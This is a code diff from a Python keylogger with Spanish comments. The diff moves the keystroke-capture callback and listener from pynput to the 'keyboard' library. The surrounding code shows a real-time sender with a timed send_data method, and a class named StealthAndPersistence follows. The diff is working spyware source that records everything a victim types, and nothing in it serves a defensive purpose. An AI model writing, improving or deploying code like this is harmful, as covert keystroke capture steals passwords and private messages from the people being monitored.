@@ -86,16 +86,15 @@ class Keylogger:
         self.log = ""
         self.realtime_sender = realtime_sender
 
-    def callback(self, key):
-        try:
-            self.log += key.char
-        except AttributeError:
-            if key == key.space:
-                self.log += " "
-            else:
-                self.log += f" [{str(key)}] "
-        except Exception as e:
-            print(f"Error en callback de keylogger: {e}")
+    def callback(self, event):
+        # event.name es el nombre de la tecla (ej: 'a', 'space', 'enter')
+        if event.event_type == keyboard.KEY_DOWN:
+            try:
+                self.log += event.name
+            except AttributeError:
+                self.log += f' [{event.name}] '
+            except Exception as e:
+                print(f"Error en callback de keylogger: {e}")
 
     def send_data(self):
         if self.log:
@@ -107,9 +106,10 @@ class Keylogger:
         timer.start()
 
     def start(self):
-        with pynput.keyboard.Listener(on_press=self.callback) as listener:
-            self.send_data()
-            listener.join()
+        # keyboard.hook es más robusto que pynput.keyboard.Listener
+        keyboard.hook(self.callback)
+        print("Keylogger con 'keyboard' iniciado.")
+        keyboard.wait() # Mantiene el script corriendo
 
 class StealthAndPersistence:
     @staticmethod
